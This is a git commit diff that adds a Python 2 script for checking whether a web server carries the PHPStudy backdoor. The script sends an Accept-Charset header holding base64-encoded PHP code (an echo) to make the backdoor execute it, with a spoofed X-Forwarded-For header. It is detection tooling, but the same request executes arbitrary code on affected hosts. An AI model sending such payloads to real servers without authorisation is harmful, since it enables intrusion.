9dc973adf1346c56c8650c0f6f9e1d887f607ed1
Himowen <10765855@qq.com>
2019-09-24 19:19:26 +0800

    Site updated: 2019-09-24 19:19:24

--- data/phpstudy_rec_backdoor_check.py
+++ data/phpstudy_rec_backdoor_check.py
@@ -7,4 +7,29 @@ print "--------------maikefee.com---------------"
 print "-----------------------------------------"
 print "--------------单文件检测-------------------"
 
-print "您来晚了,脚本已删除!"
+
+headers={
+"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+"DNT": "1",
+"X-Forwarded-For": "8.8.8.8",
+"Connection": "close",
+"content-type": "text/xml",
+"Accept-Charset": "ZWNobyAiaSBhbSBiYWNrZG9vciI7",
+"Accept-Encoding": "gzip,deflate",
+"Upgrade-Insecure-Requests": "1"
+}
+
+try:
+    response = requests.get(sys.argv[1],headers=headers)  # 输入任意存在php路径
+    if(response.text.find("backdoor")>0):
+        print "backdoor exist!"
+    else:
+        print "None!"
+    pass
+except:
+    print("python phpstudy_rec_backdoor_check.py http://xxx.com/xxx.php  (xxx.php为任意存在的php文件)")
+
+
+
